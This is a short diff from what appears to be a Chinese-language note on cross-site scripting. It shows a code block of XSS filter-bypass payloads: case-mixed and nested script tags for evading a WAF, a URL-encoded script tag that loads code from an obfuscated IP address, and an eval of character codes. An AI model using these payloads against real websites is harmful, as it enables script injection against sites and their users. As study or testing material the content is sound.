@@ -59,7 +59,12 @@ XSS平台里也获取到了。
 
 ```html
 <sCrIpt>alert(1)</script>
+
 <script%20src%3D"http%3A%2F%2F0300.0250.0000.0001"><%2Fscript>
+
 <scr<script>rip>alalertert</scr</script>rip> (需要利用waf的不完整性)
+
 <script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 120, 115, 115, 39, 41))</script>
+
 ```
+
